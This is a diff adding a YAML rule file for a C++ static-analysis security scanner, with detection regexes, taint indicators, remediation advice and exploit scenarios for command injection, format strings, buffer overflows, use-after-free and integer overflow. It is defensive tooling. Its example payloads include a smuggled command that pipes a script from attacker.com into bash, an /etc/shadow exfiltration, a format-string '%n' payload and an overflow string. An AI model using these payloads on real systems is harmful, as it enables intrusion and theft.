@@ -1,0 +1,1443 @@
+rules:
+- rule_id: CPP-INJ-001
+  title: Command Injection via system() or popen()
+  description: 'Detects use of system(), popen(), or exec*() family with user-controlled input in C++ applications, enabling
+    arbitrary OS command execution.
+
+    '
+  language: cpp
+  category: injection
+  severity: Critical
+  confidence: 0.95
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - system-call
+  - rce
+  - popen
+  - exec
+  - posix
+  patterns:
+  - type: regex
+    pattern: \bsystem\s*\(\s*(?:argv|user_input|input|param|query|buf|buffer|cmd|command)\b
+  - type: regex
+    pattern: \bpopen\s*\(\s*(?:argv|user_input|input|param|query|buf|buffer|cmd)\b
+  - type: regex
+    pattern: \bsystem\s*\(\s*(?:std::)?string\s*\(\s*"[^"]*"\s*\)\s*\+\s*\w+
+  - type: regex
+    pattern: \bsystem\s*\(\s*(?:sprintf_buffer|formatted|str\.c_str\(\))\b
+  - type: regex
+    pattern: \bexecl\s*\(\s*"/bin/sh"\s*,\s*"sh"\s*,\s*"-c"
+  - type: regex
+    pattern: \bsystem\s*\(\s*(?:std::)?(?:string|ostringstream)\s*\([^)]*\)\s*\.(?:c_str|str)\s*\(\s*\)
+  - type: regex
+    pattern: \b(?:_popen|_wsystem|_wexecl|ShellExecute|ShellExecuteEx)\s*\(\s*(?:argv|user_input|input|param|cmd|buffer)\b
+  - type: regex
+    pattern: \bsystem\s*\(\s*(?:getenv|std::getenv)\s*\(
+  anti_patterns:
+  - execvp(
+  - execv(
+  - fork()
+  - // hardcoded
+  - posix_spawn(
+  - posix_spawnp(
+  - CreateProcessW(
+  - const char* cmd = "
+  - static const
+  - constexpr
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <cstdlib>'
+    - '#include <stdlib.h>'
+    - '#include <unistd.h>'
+    - '#include <stdio.h>'
+    - '#include <process.h>'
+    - '#include <windows.h>'
+    - int main(
+    - using namespace std
+    taint_source_indicators:
+    - argv[
+    - argc
+    - std::cin
+    - getline(
+    - scanf(
+    - fgets(
+    - getenv(
+    - std::getenv(
+    - recv(
+    - read(
+    - fread(
+    - getchar(
+    taint_sink_indicators:
+    - system(
+    - popen(
+    - execl(
+    - execlp(
+    - execle(
+    - _popen(
+    - _wsystem(
+    - ShellExecute(
+    - WinExec(
+    - CreateProcess(
+    sanitization_patterns:
+    - execvp with array
+    - fork + exec
+    - posix_spawn
+    - allowlist validation
+    - isalnum check
+    - regex validation
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_level_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A C++ web service builds a command string using user-provided filename: system(("convert " + user_filename
+      + " output.png").c_str()). An attacker provides filename="; cat /etc/shadow > /tmp/leaked.txt #" to exfiltrate sensitive
+      system files.
+
+      '
+    example_payload: '; curl http://attacker.com/shell.sh | bash #'
+    attacker_objective: Execute arbitrary OS commands with the privileges of the C++ application, potentially gaining root
+      access on misconfigured systems.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Remote code execution through OS command injection in native applications.
+
+    C++ applications often run with elevated privileges, making command injection
+
+    especially dangerous. Successful exploitation can lead to full system compromise,
+
+    data exfiltration, lateral movement, or persistent backdoor installation.
+
+    '
+  remediation: "Framework-specific fixes:\n  - POSIX: use fork()/execvp() with explicit argument arrays\n  - Windows: use\
+    \ CreateProcessW() with explicit argument lists, avoid ShellExecute with user input\n  - Qt: use QProcess with argument\
+    \ list instead of single command string\n  - Boost: use boost::process::child with args vector\nSecure libraries:\n  -\
+    \ POSIX posix_spawn() / posix_spawnp() with argv arrays\n  - Boost.Process with explicit argument vectors\n  - Qt QProcess::start(program,\
+    \ arguments) with separate arguments\nPrevention strategies:\n  - Use exec*() family without shell interpretation\n  -\
+    \ Use fork()/execvp() with explicit argument arrays\n  - Validate input against strict character allowlists (alphanumeric\
+    \ only)\n  - Use POSIX spawn() instead of system()\n  - Never pass user input through a shell interpreter\n  - Apply SELinux/AppArmor\
+    \ policies to restrict process capabilities\n  - Use compile-time checks and static analysis (Coverity, Clang-Tidy)\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-002
+    - CPP-INJ-003
+    - RUBY-INJ-002
+    - RUST-INJ-002
+  detection_layer: 1
+- rule_id: CPP-INJ-002
+  title: Format String Vulnerability
+  description: 'Detects format string vulnerabilities where user-controlled input is passed as the format string to printf/sprintf
+    family functions, enabling memory reads, writes, and potential code execution.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.94
+  cwe: CWE-134
+  owasp: A03:2021-Injection
+  tags:
+  - format-string
+  - memory-corruption
+  - rce
+  - printf
+  - syslog
+  - information-disclosure
+  patterns:
+  - type: regex
+    pattern: \b(?:printf|fprintf|sprintf|snprintf|vprintf|vfprintf|vsprintf|vsnprintf)\s*\(\s*(?:argv|user_input|input|param|buf|buffer|str|data)\b
+  - type: regex
+    pattern: \bprintf\s*\(\s*(?:argv\[\d+\]|input|user_input|param|buf)\b
+  - type: regex
+    pattern: \b(?:syslog|err|warn)\s*\(\s*\w+\s*,\s*(?:argv|user_input|input|param|buf)\b
+  - type: regex
+    pattern: \bsprintf\s*\(\s*\w+\s*,\s*(?:argv|user_input|input|param)\b
+  - type: regex
+    pattern: \b(?:wprintf|fwprintf|swprintf|vswprintf)\s*\(\s*(?:argv|user_input|input|param|buf|buffer)\b
+  - type: regex
+    pattern: \bsyslog\s*\(\s*LOG_\w+\s*,\s*(?:argv|user_input|input|param|buf)\b
+  - type: regex
+    pattern: \b(?:fprintf|printf)\s*\(\s*(?:stderr|stdout)\s*,\s*(?:argv|user_input|input|param|buf)\b
+  anti_patterns:
+  - printf("%s"
+  - printf("%d"
+  - snprintf(.*"%s".*input
+  - printf("%.*s"
+  - std::cout
+  - std::cerr
+  - fmt::format
+  - 'spdlog::'
+  - std::format
+  - LOG(
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <stdio.h>'
+    - '#include <cstdio>'
+    - '#include <syslog.h>'
+    - '#include <err.h>'
+    - '#include <wchar.h>'
+    - int main(
+    - void handle_request
+    taint_source_indicators:
+    - argv[
+    - std::cin
+    - getline(
+    - scanf(
+    - fgets(
+    - recv(
+    - read(
+    - getenv(
+    - fread(
+    - recvfrom(
+    taint_sink_indicators:
+    - printf(
+    - fprintf(
+    - sprintf(
+    - snprintf(
+    - syslog(
+    - err(
+    - warn(
+    - wprintf(
+    - vprintf(
+    - vsprintf(
+    sanitization_patterns:
+    - explicit format string
+    - '"%s"'
+    - '"%d"'
+    - std::cout
+    - fmt::format
+    - std::format
+    - spdlog
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + memory_write_capability_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A network daemon logs client-provided hostnames using syslog(LOG_INFO, hostname). An attacker connects
+      with a hostname set to "%x.%x.%x.%x.%n", reading stack memory and then writing to an arbitrary address to hijack control
+      flow.
+
+      '
+    example_payload: '%08x.%08x.%08x.%08x.%n'
+    attacker_objective: Read sensitive data from stack memory (credentials, addresses), write to arbitrary memory locations
+      to hijack control flow, or crash the application.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Format string attacks enable reading stack memory (information disclosure),
+
+    writing to arbitrary memory addresses (code execution via GOT overwrite
+
+    or return address manipulation), crashing applications (denial of service),
+
+    and bypassing ASLR/stack canaries through information leaks.
+
+    '
+  remediation: "Framework-specific fixes:\n  - C: always use explicit format strings: printf(\"%s\", user_input)\n  - C++:\
+    \ prefer std::cout, std::format (C++20), or fmt::format over printf family\n  - Syslog: always use syslog(priority, \"\
+    %s\", user_message)\n  - Qt: use qDebug() << variable instead of printf-style formatting\nSecure libraries:\n  - {fmt}\
+    \ library (fmtlib/fmt) for type-safe formatting\n  - spdlog for type-safe logging\n  - std::format (C++20) for compile-time\
+    \ checked formatting\n  - Boost.Format for safe string formatting\nPrevention strategies:\n  - Never pass user input as\
+    \ the format string parameter\n  - Use compiler warnings: -Wformat -Wformat-security -Werror=format-security\n  - Use\
+    \ static analysis tools (Coverity, Clang-Tidy, cppcheck) to detect format string bugs\n  - Enable FORTIFY_SOURCE: compile\
+    \ with -D_FORTIFY_SOURCE=2\n  - Use GCC's __attribute__((format)) to validate format string functions\n  - Deploy with\
+    \ ASLR, stack canaries, and non-executable stack as defense in depth\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/134.html
+  - https://owasp.org/www-community/attacks/Format_string_attack
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-001
+    - CPP-INJ-003
+  detection_layer: 1
+- rule_id: CPP-INJ-003
+  title: Buffer Overflow via Unsafe String Functions
+  description: 'Detects use of unsafe C string functions (strcpy, strcat, gets, sprintf) that do not perform bounds checking,
+    leading to buffer overflow vulnerabilities.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.92
+  cwe: CWE-120
+  owasp: A03:2021-Injection
+  tags:
+  - buffer-overflow
+  - memory-safety
+  - stack-smashing
+  - heap-corruption
+  - strcpy
+  - gets
+  patterns:
+  - type: regex
+    pattern: \b(?:strcpy|strcat|gets|sprintf|vsprintf)\s*\(
+  - type: regex
+    pattern: \bscanf\s*\(\s*"%s"
+  - type: regex
+    pattern: \bstrcpy\s*\(\s*\w+\s*,\s*(?:argv|input|user|buf|param|data)\b
+  - type: regex
+    pattern: \bstrcat\s*\(\s*\w+\s*,\s*(?:argv|input|user|buf|param|data)\b
+  - type: regex
+    pattern: \bgets\s*\(\s*\w+\s*\)
+  - type: regex
+    pattern: \bscanf\s*\(\s*"%\d*s"\s*,\s*(?:argv|input|user|buf|param|data)\b
+  - type: regex
+    pattern: \b(?:wcscpy|wcscat|_tcscpy|_tcscat|lstrcpy|lstrcpyA|lstrcpyW)\s*\(
+  anti_patterns:
+  - strncpy
+  - strncat
+  - snprintf
+  - std::string
+  - strlcpy
+  - strlcat
+  - StringCchCopy
+  - StringCbCopy
+  - wcsncpy
+  - memcpy_s
+  - strcpy_s
+  - strcat_s
+  - std::array
+  - std::vector
+  - gsl::span
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <string.h>'
+    - '#include <cstring>'
+    - '#include <stdio.h>'
+    - '#include <stdlib.h>'
+    - '#include <wchar.h>'
+    - char.*\[.*\]
+    - char\s*\*
+    - int main(
+    taint_source_indicators:
+    - argv[
+    - std::cin
+    - getline(
+    - scanf(
+    - fgets(
+    - recv(
+    - read(
+    - getenv(
+    - fread(
+    - recvfrom(
+    - gets(
+    taint_sink_indicators:
+    - strcpy(
+    - strcat(
+    - gets(
+    - sprintf(
+    - vsprintf(
+    - scanf(
+    - wcscpy(
+    - wcscat(
+    - lstrcpy(
+    - memcpy(
+    sanitization_patterns:
+    - strlen check
+    - sizeof check
+    - bounds check
+    - if (len < sizeof
+    - strnlen
+    - std::min
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + stack_vs_heap_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A network service reads a username from a socket into a fixed-size stack buffer using strcpy(username_buf,
+      received_data). An attacker sends an oversized username string to overwrite the return address on the stack, redirecting
+      execution to attacker-controlled shellcode or a ROP chain.
+
+      '
+    example_payload: python -c "print('A'*256 + '\xef\xbe\xad\xde')"
+    attacker_objective: Overwrite return addresses or function pointers to hijack control flow, execute arbitrary shellcode,
+      or leverage ROP chains for code execution.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  impact: 'Buffer overflow enables stack smashing, heap corruption, code execution
+
+    via return address overwrite, ROP chain exploitation, and denial of service.
+
+    Modern exploit mitigations (ASLR, stack canaries, DEP/NX) reduce but do
+
+    not eliminate the risk. Information leaks from other bugs (e.g., format
+
+    strings) can be chained to bypass these protections.
+
+    '
+  remediation: "Framework-specific fixes:\n  - POSIX/Linux: replace strcpy with strlcpy (BSD) or strncpy with null termination\n\
+    \  - Windows: use StringCchCopy/StringCbCopy from strsafe.h or strcpy_s from safecrt\n  - Qt: use QString instead of C-style\
+    \ char arrays\n  - Embedded: use bounded copy functions with explicit size parameters\nSecure libraries:\n  - std::string\
+    \ in C++ instead of C-style strings (strongly preferred)\n  - gsl::span and gsl::string_span from Guideline Support Library\n\
+    \  - SafeInt library for integer overflow checks before allocation\n  - strlcpy/strlcat (BSD-origin safe string functions)\n\
+    \  - Microsoft Safe CRT functions (strcpy_s, strcat_s, sprintf_s)\nPrevention strategies:\n  - Replace strcpy with strncpy/strlcpy\
+    \ and always null-terminate\n  - Replace strcat with strncat/strlcat\n  - Replace sprintf with snprintf\n  - Replace gets\
+    \ with fgets (gets is removed in C11)\n  - Use std::string in C++ instead of C-style strings\n  - Enable stack protection:\
+    \ -fstack-protector-strong\n  - Enable address sanitizer in testing: -fsanitize=address\n  - Compile with -D_FORTIFY_SOURCE=2\
+    \ for runtime buffer overflow detection\n  - Use Valgrind/ASan/MSan in CI/CD for memory safety testing\n  - Follow C++\
+    \ Core Guidelines and use the Guideline Support Library\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/120.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-001
+    - CPP-INJ-002
+  detection_layer: 1
+- rule_id: CPP-INJ-004
+  title: Use-After-Free Vulnerability
+  description: 'Detects use-after-free vulnerabilities where heap-allocated memory is accessed after being freed, leading
+    to dangling pointer dereferences. Attackers can reclaim the freed memory region with controlled data, enabling arbitrary
+    read/write primitives, vtable hijacking in C++ objects, and ultimately remote code execution. This class of bug is among
+    the most exploited in modern real-world attacks against browsers, kernels, and network daemons.
+
+    '
+  language: cpp
+  category: injection
+  severity: Critical
+  confidence: 0.91
+  cwe: CWE-416
+  owasp: A06:2021-Vulnerable and Outdated Components
+  tags:
+  - use-after-free
+  - dangling-pointer
+  - memory-corruption
+  - heap-exploitation
+  - vtable-hijack
+  - double-free
+  - temporal-safety
+  detection_layer: 3
+  attack_surface_type: memory-management
+  patterns:
+  - type: regex
+    description: free() followed by usage of same pointer variable on subsequent lines
+    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\b\1\b
+  - type: regex
+    description: delete on a pointer followed by dereference without nulling
+    pattern: \bdelete\s+(\w+)\s*;(?!\s*\1\s*=\s*nullptr)[^}]*\1\s*->
+  - type: regex
+    description: delete[] on array pointer followed by access without null assignment
+    pattern: \bdelete\s*\[\]\s*(\w+)\s*;(?!\s*\1\s*=\s*nullptr)[^}]*\1\s*\[
+  - type: regex
+    description: Pointer used after conditional free without null guard
+    pattern: \bif\s*\([^)]*\)\s*\{[^}]*\bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\}[^}]*\b\1\b
+  - type: regex
+    description: Object method call on a pointer that was previously deleted
+    pattern: \bdelete\s+(\w+)\s*;[^}]*\1\s*->\s*\w+\s*\(
+  - type: regex
+    description: Returning a pointer to stack-local or freed memory
+    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\breturn\s+\1\s*;
+  - type: regex
+    description: 'Double-free pattern: free called twice on same pointer'
+    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\bfree\s*\(\s*\1\s*\)\s*;
+  - type: regex
+    description: shared_ptr/unique_ptr release followed by raw pointer usage
+    pattern: \.release\s*\(\s*\)\s*;[^}]*\b(?:->|\.get\s*\(\s*\))
+  anti_patterns:
+  - = nullptr
+  - = NULL
+  - = 0;
+  - std::unique_ptr
+  - std::shared_ptr
+  - std::weak_ptr
+  - boost::shared_ptr
+  - std::make_unique
+  - std::make_shared
+  - gsl::owner
+  - RAII
+  bypass_variants:
+  - description: 'Aliased pointer: freed through one alias, accessed through another'
+    pattern: \w+\s*=\s*(\w+)\s*;[^}]*\bfree\s*\(\s*\1\s*\)\s*;
+  - description: Container element freed while iterator still references it
+    pattern: \bdelete\s+\*\s*it\s*;[^}]*\bit\s*->
+  - description: Freed pointer passed to another function that dereferences it
+    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\b\w+\s*\(\s*\1\s*[,)]
+  evasion_indicators:
+  - Pointer aliasing across multiple variables before free
+  - Free in error/exception handler with continued use in normal path
+  - Callback or signal handler that frees memory still referenced by main thread
+  - Cross-function free where the caller retains a stale copy of the pointer
+  encoding_variants:
+  - type: macro_obfuscation
+    pattern: \b(?:SAFE_FREE|MY_DELETE|RELEASE_PTR)\s*\(\s*\w+\s*\)
+  - type: custom_allocator
+    pattern: \b(?:pool_free|arena_dealloc|mem_release|custom_free)\s*\(\s*\w+\s*\)
+  - type: indirect_free
+    pattern: \bvoid\s*\(\s*\*\s*free_fn\s*\)\s*\(
+  multi_function_chain_patterns:
+  - malloc -> use -> free -> use (same pointer, no null assignment)
+  - new -> store in container -> delete -> container access
+  - acquire_resource -> release_resource -> access_resource (lifecycle violation)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Heap memory reclamation allows vtable pointer overwrite, enabling arbitrary code execution with the
+      privileges of the vulnerable process.
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: malloc/new allocation from user-controlled size or network data
+    sink: Dereferencing pointer after free/delete
+    through: 'Heap allocator reuse: attacker-controlled allocation reclaims the freed chunk, placing controlled data at the
+      dangling pointer location'
+  - source: Object constructor with attacker-influenced fields
+    sink: Virtual method call on deleted object
+    through: Vtable pointer overwrite via heap spray after free
+  impact: 'Use-after-free is one of the most dangerous memory corruption classes.
+
+    Exploitation enables arbitrary code execution through vtable hijacking,
+
+    heap metadata corruption, and function pointer overwrite. Attackers can
+
+    use heap spraying or feng shui techniques to reclaim freed memory with
+
+    controlled content, gaining reliable exploitation primitives. UAF bugs
+
+    account for a large proportion of real-world browser, kernel, and server
+
+    exploits. They can bypass ASLR when combined with information leaks and
+
+    defeat CFI/CET when exploiting virtual dispatch.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Modern C++: use std::unique_ptr for exclusive ownership, std::shared_ptr for\
+    \ shared ownership\n  - Legacy C: always set pointers to NULL immediately after free()\n  - Qt: use QPointer for guarded\
+    \ QObject pointers that auto-null on deletion\n  - Chromium: use base::raw_ptr<T> or raw_ref<T> with BackupRefPtr (MiraclePtr)\n\
+    Secure libraries:\n  - Smart pointers (std::unique_ptr, std::shared_ptr, std::weak_ptr)\n  - Guideline Support Library\
+    \ gsl::owner<T*> for ownership annotation\n  - Boost.SmartPtr for cross-platform smart pointer support\n  - Rust FFI bindings\
+    \ for memory-critical components\nPrevention strategies:\n  - Adopt RAII principles: tie resource lifetime to object lifetime\n\
+    \  - Set freed pointers to nullptr immediately after free/delete\n  - Use AddressSanitizer (-fsanitize=address) to detect\
+    \ UAF at runtime\n  - Use MemorySanitizer and UBSan for additional temporal safety checks\n  - Enable Clang's -fsanitize=memory\
+    \ and -fsanitize=undefined in CI\n  - Use static analyzers: Clang Static Analyzer, Coverity, Infer (Facebook)\n  - Deploy\
+    \ with hardware-assisted tagging (ARM MTE) where available\n  - Consider memory-safe language rewrites for critical parsing/network\
+    \ code\n  - Enforce C++ Core Guidelines lifetime profiles via compiler tooling\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/416.html
+  - https://owasp.org/www-community/vulnerabilities/Using_freed_memory
+  - https://chromium.googlesource.com/chromium/src/+/HEAD/docs/dangling_ptr.md
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <stdlib.h>'
+    - '#include <cstdlib>'
+    - '#include <memory>'
+    - '#include <new>'
+    - class.*virtual
+    - struct.*{
+    - void* operator new
+    taint_source_indicators:
+    - malloc(
+    - calloc(
+    - realloc(
+    - 'new '
+    - new[]
+    - strdup(
+    - mmap(
+    - operator new(
+    taint_sink_indicators:
+    - free(
+    - 'delete '
+    - delete[]
+    - realloc(
+    - munmap(
+    - operator delete(
+    - cfree(
+    sanitization_patterns:
+    - = nullptr
+    - = NULL
+    - = 0
+    - std::unique_ptr
+    - std::shared_ptr
+    - std::move
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + heap_controllability_factor + vtable_presence_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A C++ HTTP server manages session objects on the heap. When a client disconnects, the session object
+      is deleted but a reference is retained in a global lookup table. An attacker triggers a disconnect, then rapidly creates
+      a new connection whose allocation reclaims the freed session memory. The attacker crafts their request to overwrite
+      the vtable pointer of the stale session object. When the server processes a queued callback referencing the old session,
+      it calls a virtual method through the attacker-controlled vtable, redirecting execution to shellcode placed in the replacement
+      allocation.
+
+      '
+    example_payload: Heap spray with 0x41414141 vtable pointer + ROP chain payload in reclaimed chunk
+    attacker_objective: Reclaim freed heap memory with attacker-controlled data to hijack virtual method dispatch or function
+      pointers, achieving arbitrary code execution.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-003
+    - CPP-INJ-005
+    - CPP-INJ-006
+- rule_id: CPP-INJ-005
+  title: Integer Overflow in Memory Allocation
+  description: 'Detects integer overflow or wraparound vulnerabilities in size calculations used for memory allocation. When
+    an arithmetic operation on user-controlled values overflows before being passed to malloc, calloc, new, or similar allocators,
+    the resulting buffer is undersized. Subsequent writes into this buffer using the original (pre-overflow) size cause heap
+    buffer overflows, enabling heap corruption, arbitrary code execution, and denial of service.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-190
+  owasp: A03:2021-Injection
+  tags:
+  - integer-overflow
+  - memory-allocation
+  - heap-overflow
+  - wraparound
+  - size-calculation
+  - denial-of-service
+  - arbitrary-write
+  detection_layer: 2
+  attack_surface_type: arithmetic-memory-boundary
+  patterns:
+  - type: regex
+    description: malloc with arithmetic expression on user-controlled size
+    pattern: \bmalloc\s*\(\s*(?:argv|user_input|input|param|size|len|count|num|n)\s*\*\s*(?:sizeof|size|len|\d+)\s*\)
+  - type: regex
+    description: calloc with user-controlled count and size parameters
+    pattern: \bcalloc\s*\(\s*(?:argv|user_input|input|param|count|num|n)\s*,\s*(?:sizeof|size|len|\d+)\s*\)
+  - type: regex
+    description: new[] operator with unchecked multiplication in size expression
+    pattern: \bnew\s+\w+\s*\[\s*(?:argv|user_input|input|param|count|num|n)\s*\*
+  - type: regex
+    description: realloc with arithmetic on sizes without overflow check
+    pattern: \brealloc\s*\(\s*\w+\s*,\s*\w+\s*\*\s*(?:sizeof|\d+|size|len)\s*\)
+  - type: regex
+    description: Addition-based size calculation without overflow check before allocation
+    pattern: \b(?:malloc|calloc|realloc)\s*\(\s*\w+\s*\+\s*\w+\s*\)
+  - type: regex
+    description: Shift-based size calculation risking overflow
+    pattern: \b(?:malloc|new\s+\w+\s*\[)\s*(?:\w+\s*<<\s*\d+)
+  - type: regex
+    description: VirtualAlloc/HeapAlloc with unchecked user-controlled size on Windows
+    pattern: \b(?:VirtualAlloc|HeapAlloc|GlobalAlloc|LocalAlloc)\s*\([^)]*(?:argv|user_input|input|param|size|count)\s*\*
+  - type: regex
+    description: mmap with user-influenced length parameter
+    pattern: \bmmap\s*\([^)]*(?:argv|user_input|input|param|size|count)\s*\*
+  anti_patterns:
+  - SafeInt
+  - safe_mul
+  - checked_mul
+  - __builtin_mul_overflow
+  - __builtin_add_overflow
+  - std::numeric_limits
+  - UINT_MAX
+  - SIZE_MAX
+  - if.*> SIZE_MAX
+  - if.*overflow
+  - safemath
+  - CheckedNumeric
+  bypass_variants:
+  - description: Overflow in intermediate variable before passing to allocator
+    pattern: \w+\s*=\s*\w+\s*\*\s*(?:sizeof|\d+)\s*;[^}]*\b(?:malloc|new)\s*[\(\[]\s*\w+
+  - description: Truncation via implicit narrowing cast before allocation
+    pattern: \b(?:unsigned\s+short|uint16_t|unsigned\s+char)\s+\w+\s*=\s*\w+\s*\*\s*\w+\s*;[^}]*\b(?:malloc|new)
+  evasion_indicators:
+  - Size calculation split across multiple statements to hide overflow
+  - Intermediate cast to smaller integer type truncating the result
+  - Multiplication result stored in 32-bit variable on 64-bit platform
+  - Size parameter read from untrusted file header or network packet field
+  encoding_variants:
+  - type: macro_hidden_arithmetic
+    pattern: \b(?:ALLOC_ARRAY|ARRAY_SIZE|CALC_SIZE)\s*\(\s*\w+\s*,\s*\w+\s*\)
+  - type: template_arithmetic
+    pattern: \b(?:alloc|allocate|create_buffer)\s*<[^>]+>\s*\(\s*\w+\s*\*\s*\w+\s*\)
+  multi_function_chain_patterns:
+  - read_size_from_input -> multiply_by_element_size -> malloc(undersized) -> memcpy(original_size)
+  - parse_header(count) -> count * sizeof(element) -> new[overflowed_size] -> fill_array(count)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Undersized heap allocation from integer overflow enables controlled heap buffer overflow, which can
+      corrupt adjacent heap metadata or objects for arbitrary write primitives.
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: User-supplied size/count field from network packet, file header, or API parameter
+    sink: malloc/calloc/new[] allocation size argument
+    through: Unchecked arithmetic multiplication or addition that wraps around, producing a small allocation for a large logical
+      size
+  - source: Parsed integer from untrusted serialized data (protobuf, JSON, binary)
+    sink: Buffer allocation followed by memcpy/loop fill using original pre-overflow count
+    through: Implicit truncation or unsigned wraparound in size computation
+  impact: "Integer overflow in allocation sizes is a high-severity vulnerability class\nthat directly leads to heap buffer\
+    \ overflows. The undersized buffer is\nfilled using the original (non-overflowed) size, corrupting adjacent heap\nchunks.\
+    \ This enables:\n  - Heap metadata corruption for arbitrary write primitives\n  - Overwriting adjacent heap-allocated\
+    \ objects (vtable pointers, function pointers)\n  - Reliable exploitation via heap grooming/feng shui techniques\n  -\
+    \ Denial of service through heap corruption and crashes\nThis vulnerability class has been exploited extensively in image\
+    \ parsers,\nmedia codecs, network protocol implementations, and file format handlers.\n"
+  remediation: "Framework-specific fixes:\n  - GCC/Clang: use __builtin_mul_overflow() and __builtin_add_overflow() for checked\
+    \ arithmetic\n  - MSVC: use SafeInt<T> or IntSafe.h (UIntMult, SizeTMult) from the Windows SDK\n  - Chromium: use base::CheckedNumeric<T>\
+    \ or base::StrictNumeric<T>\n  - Rust FFI: perform size calculations in Rust with checked arithmetic before calling C\
+    \ allocators\nSecure libraries:\n  - SafeInt library (Microsoft) for overflow-safe integer arithmetic\n  - Boost.SafeNumerics\
+    \ for compile-time and runtime overflow detection\n  - Google Abseil safe integer utilities (absl::uint128)\n  - GCC/Clang\
+    \ __builtin_*_overflow family of builtins\n  - CERT INT32-C compliant arithmetic wrappers\nPrevention strategies:\n  -\
+    \ Always validate that size * count and size + offset cannot overflow before allocation\n  - Use calloc(count, size) which\
+    \ internally checks for overflow (on conforming implementations)\n  - Prefer size_t for all size computations and check\
+    \ against SIZE_MAX / element_size\n  - Set maximum allocation limits based on application context\n  - Use AddressSanitizer\
+    \ to detect heap overflows from undersized allocations\n  - Enable UBSan (-fsanitize=undefined) to trap signed integer\
+    \ overflow\n  - Enable -ftrapv for signed overflow trapping in debug/test builds\n  - Use static analysis tools (Coverity,\
+    \ PVS-Studio) to detect unchecked arithmetic\n  - Fuzz allocation paths with AFL/libFuzzer to discover overflow-triggered\
+    \ crashes\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/190.html
+  - https://wiki.sei.cmu.edu/confluence/display/c/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow
+  - https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <stdlib.h>'
+    - '#include <cstdlib>'
+    - '#include <new>'
+    - '#include <cstdint>'
+    - '#include <limits>'
+    - '#include <climits>'
+    - size_t
+    - uint32_t
+    - unsigned int
+    taint_source_indicators:
+    - argv[
+    - std::cin
+    - scanf(
+    - fgets(
+    - recv(
+    - read(
+    - fread(
+    - getline(
+    - atoi(
+    - strtoul(
+    - strtol(
+    - sscanf(
+    - ntohl(
+    - ntohs(
+    taint_sink_indicators:
+    - malloc(
+    - calloc(
+    - realloc(
+    - 'new '
+    - new[]
+    - VirtualAlloc(
+    - HeapAlloc(
+    - mmap(
+    - operator new(
+    - aligned_alloc(
+    sanitization_patterns:
+    - __builtin_mul_overflow
+    - __builtin_add_overflow
+    - SafeInt
+    - CheckedNumeric
